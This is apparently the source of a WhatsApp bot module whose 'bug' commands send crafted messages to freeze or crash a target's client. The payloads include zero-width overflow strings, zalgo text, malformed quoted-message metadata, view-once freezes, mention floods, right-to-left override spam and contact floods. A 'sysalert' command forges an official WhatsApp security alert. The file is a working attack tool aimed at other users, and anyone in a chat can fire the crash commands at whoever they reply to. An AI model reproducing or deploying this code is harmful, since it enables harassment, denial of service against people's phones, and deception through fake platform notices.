// Bug commands — crash / annoy tricks.
// crash/freeze/ghostping/tina/zalgo/rtlbug are PUBLIC (owner: false).
//   Anyone can use them — but the target is always the QUOTED / REPLIED-TO person.
//   If you reply to someone's message and type .crash, THEY get crashed, not you.
// sysalert / cspam / repeatbug / bugmenu / blankbug stay owner-only (sensitive).

import { say } from '../lib/card.js';
import { PREFIX } from '../lib/config.js';

/* ------------------------------------------------------------------ helpers */

function overflowText(repeat = 2000) {
  const ZWJ = '\u200d', ZWNJ = '\u200c';
  return (ZWJ + ZWNJ).repeat(repeat);
}

function zalgoChar(ch) {
  const above = ['\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308','\u030a','\u030b','\u030d','\u030e','\u0310','\u0312','\u0313','\u0315','\u031a','\u031b','\u033d','\u033e','\u033f','\u0342','\u0344','\u0346','\u034a','\u034b','\u034c','\u0350','\u0351','\u0352','\u0357','\u0358','\u035b'];
  const below = ['\u0316','\u0317','\u0318','\u0319','\u031c','\u031d','\u031e','\u031f','\u0320','\u0324','\u0325','\u0326','\u0329','\u032a','\u032b','\u032c','\u032d','\u032e','\u032f','\u0330','\u0331','\u0332','\u0333','\u0339','\u033a','\u033b','\u033c','\u0345','\u0347','\u0348','\u0349','\u034d','\u034e','\u0353','\u0354','\u0355','\u0356','\u0359','\u035a','\u035f'];
  const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
  let out = ch;
  for (let i = 0; i < 15; i++) out += pick(above);
  for (let i = 0; i < 10; i++) out += pick(below);
  return out;
}
function zalgo(text) { return [...text].map(zalgoChar).join(''); }

const RLO = '\u202e', PDF = '\u202c';
function rtlFlip(text) { return RLO + text + PDF; }

function fakeSystem(lines) {
  return [
    '🔒 *WhatsApp Security*',
    '━━━━━━━━━━━━━━━━━━━━',
    ...lines,
    '━━━━━━━━━━━━━━━━━━━━',
    '_This is an automated alert from WhatsApp._'
  ].join('\n');
}

function spamContactsPayload(count = 60) {
  const contacts = [];
  for (let i = 0; i < count; i++) {
    const num = `+9477${String(i).padStart(7, '0')}`;
    contacts.push({
      displayName: `Contact ${i}`,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nFN:Contact ${i}\nTEL;type=CELL;waid=${num.replace('+','')}:${num}\nEND:VCARD`
    });
  }
  return contacts;
}

// Strong crash: broken extendedTextMessage contextInfo
// Renderer tries to look up the stanzaId and render the zalgo quoted body → chokes
function extendedCrashPayload(text = '👋') {
  return {
    extendedTextMessage: {
      text: text + overflowText(500),
      contextInfo: {
        stanzaId: overflowText(1000),
        participant: '0@s.whatsapp.net',
        quotedMessage: {
          conversation: zalgo(text) + overflowText(800),
        },
        mentionedJid: Array.from({ length: 20 }, (_, i) =>
          `9477${String(i).padStart(7, '0')}@s.whatsapp.net`
        ),
      }
    }
  };
}

// viewOnce freeze: allocates giant string on open
function viewOnceFreezePayload() {
  const inner = overflowText(6000) + zalgo('WhatsApp') + overflowText(4000);
  return {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: inner,
          contextInfo: {
            stanzaId: overflowText(500),
            quotedMessage: { conversation: inner },
          }
        }
      }
    }
  };
}

// Ghost ping: 20 fake @mentions — avatar resolver blocks UI thread
function mentionFloodPayload(text) {
  const fakeJids = Array.from({ length: 20 }, (_, i) =>
    `9477${String(i * 7 + 1).padStart(7, '0')}@s.whatsapp.net`
  );
  return {
    extendedTextMessage: {
      text: fakeJids.map((j) => `@${j.split('@')[0]}`).join(' ') + '\n' + (text || '') + overflowText(300),
      contextInfo: { mentionedJid: fakeJids }
    }
  };
}

/* ------------------------------------------------------------------ shared runner
   Public bug commands all do the same thing:
     1. Resolve target from quoted message / mention / number / fallback to chat
     2. Build payload
     3. Send payload QUOTED on the TARGET's own message  ← key change
        (the crash lands as a reply to their message, so THEY see it first)
     4. Reply success to the sender (silent: no ping)
*/
async function sendBug({ sock, jid, msg, reply, targetJid, payload, label }) {
  const target = targetJid() || jid;

  // Get the quoted message key so we reply into the target's own message thread.
  // If the sender replied to the target's message, use that as the quote.
  const ctx = msg.message?.extendedTextMessage?.contextInfo;
  const quotedKey = ctx?.stanzaId
    ? { remoteJid: jid, id: ctx.stanzaId, participant: ctx.participant || target }
    : msg.key; // fallback: reply to the command message itself

  try {
    // Send the crash payload as a "reply" to the target's message
    await sock.sendMessage(target, payload, {
      quoted: { key: quotedKey, message: { conversation: '' } }
    });
    // Confirm to sender without mentioning them (raw text, no ping)
    await reply(`✅ ${label} → @${target.split('@')[0]}`);
  } catch (err) {
    await reply(`❌ Failed: ${err?.message || err}`);
  }
}

/* ------------------------------------------------------------------ commands */

export default [

  // ── bugmenu ──────────────────────────────────────────────────────────────
  {
    name: 'bugmenu', aliases: ['bughelp', 'bugslist'],
    owner: true,
    async run({ reply }) {
      const p = PREFIX;
      return reply([
        '╭━━━〔 🐛 *BUG COMMANDS* 〕━━━⬣',
        '┃ Reply to target message then use cmd.',
        '┃',
        `┃ 💥 ${p}crash      — context overflow crash`,
        `┃ ❄️  ${p}freeze     — view-once open crash`,
        `┃ 👥 ${p}ghostping  — mention flood lag`,
        `┃ 🌀 ${p}zalgo      — glitch-text render lag`,
        `┃ 🔄 ${p}rtlbug     — BiDi flip crash`,
        `┃ 💔 ${p}tina       — dramatic roast crash`,
        '┃',
        `┃ 👻 ${p}blankbug   — invisible giant blob  [owner]`,
        `┃ 🔒 ${p}sysalert   — fake system alert     [owner]`,
        `┃ 📇 ${p}cspam      — contact-list flood    [owner]`,
        `┃ 🔁 ${p}repeatbug  — repeat-text freeze    [owner]`,
        `┃ 💣 ${p}gcrash     — group crash           [owner]`,
        '┃',
        '┃ 💡 Reply to someone\'s msg → they get hit.',
        `┃ e.g. reply to msg → type ${p}freeze`,
        '╰━━━━━━━━━━━━━━━━━━━━⬣',
      ].join('\n'));
    },
  },

  // ── crash ─────────────────────────────────────────────────────────────────
  // PUBLIC — reply to target's message, type .crash
  {
    name: 'crash', aliases: ['notifbug'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const text = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || '👋';
      await sendBug({ sock, jid, msg, reply, targetJid, payload: extendedCrashPayload(text), label: 'Crash sent' });
    },
  },

  // ── freeze ────────────────────────────────────────────────────────────────
  // PUBLIC — strongest, view-once open → hard freeze
  {
    name: 'freeze', aliases: ['viewoncecrash', 'opencrash'],
    owner: false,
    async run({ sock, jid, msg, reply, targetJid }) {
      await sendBug({ sock, jid, msg, reply, targetJid, payload: viewOnceFreezePayload(), label: 'Freeze sent' });
    },
  },

  // ── ghostping ─────────────────────────────────────────────────────────────
  // PUBLIC — 20 fake @mentions, avatar resolver freezes
  {
    name: 'ghostping', aliases: ['mentionflood', 'ghostmention'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const text = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim();
      await sendBug({ sock, jid, msg, reply, targetJid, payload: mentionFloodPayload(text), label: 'Ghost ping sent' });
    },
  },

  // ── zalgo ─────────────────────────────────────────────────────────────────
  // PUBLIC
  {
    name: 'zalgo', aliases: ['glitch', 'cursedtext'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const base = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'WhatsApp';
      await sendBug({ sock, jid, msg, reply, targetJid, payload: { text: zalgo(base) }, label: 'Zalgo sent' });
    },
  },

  // ── rtlbug ────────────────────────────────────────────────────────────────
  // PUBLIC
  {
    name: 'rtlbug', aliases: ['rtl', 'fliptext'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const base = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Hello from WhatsApp';
      const payload = { text: Array.from({ length: 10 }, () => rtlFlip(base)).join('\n') };
      await sendBug({ sock, jid, msg, reply, targetJid, payload, label: 'RTL-bug sent' });
    },
  },

  // ── tina ──────────────────────────────────────────────────────────────────
  // PUBLIC — dramatic Sinhala roast + extendedCrash
  {
    name: 'tina', aliases: ['tinabug', 'dramabug'],
    owner: false,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const name = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Tina';
      const visible = [
        `💔 *${name}*, ඔයා ගැන කතා කරන්නත් කාලය නාස්ති කරන්නේ නෑ.`,
        `ඔය number block list ළ දාලා ඉවරයි 🚫`,
        `WhatsApp uninstall කරන්නම හොඳයි 😂`,
        `RIO-XMD bot ළ ඔයාට space නෑ 👋`,
      ].join('\n');
      await sendBug({ sock, jid, msg, reply, targetJid, payload: extendedCrashPayload(visible), label: 'Tina bug sent' });
    },
  },

  // ── blankbug ──────────────────────────────────────────────────────────────
  // OWNER — giant invisible blob
  {
    name: 'blankbug', aliases: ['nullmsg', 'emptybug'],
    owner: true,
    async run({ sock, jid, msg, reply, targetJid }) {
      const target = targetJid() || jid;
      try {
        await sock.sendMessage(target, { text: overflowText(5000) }, { quoted: msg });
        return reply(`✅ Blank-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── sysalert ──────────────────────────────────────────────────────────────
  // OWNER
  {
    name: 'sysalert', aliases: ['fakealert', 'fakesys'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const custom = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim();
      const payload = fakeSystem(
        custom
          ? [custom]
          : [
              '⚠️ Unusual sign-in activity detected.',
              'Your account may have been accessed',
              'from an unrecognized device.',
              '',
              'Tap *Settings → Linked Devices*',
              'and remove any device you don\'t recognize.'
            ]
      );
      try {
        await sock.sendMessage(target, { text: payload }, { quoted: msg });
        return reply(`✅ Fake-alert sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── cspam ─────────────────────────────────────────────────────────────────
  // OWNER
  {
    name: 'cspam', aliases: ['contactspam', 'contactbug'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const count = Math.min(100, Math.max(1, parseInt(args.find((a) => /^\d+$/.test(a)) || '60', 10)));
      try {
        await sock.sendMessage(target, { contacts: { displayName: `${count} Contacts`, contacts: spamContactsPayload(count) } }, { quoted: msg });
        return reply(`✅ ${count} contacts sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },

  // ── repeatbug ─────────────────────────────────────────────────────────────
  // OWNER
  {
    name: 'repeatbug', aliases: ['repeatcrash', 'spamtext'],
    owner: true,
    async run({ sock, jid, msg, args, reply, targetJid }) {
      const target = targetJid() || jid;
      const word = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, '')) && a.length <= 20).join(' ').trim() || 'ha';
      try {
        await sock.sendMessage(target, { text: (word + ' ').repeat(4000).trimEnd() }, { quoted: msg });
        return reply(`✅ Repeat-bug sent to @${target.split('@')[0]}`);
      } catch (err) {
        return reply(`❌ Failed: ${err?.message || err}`);
      }
    },
  },
];
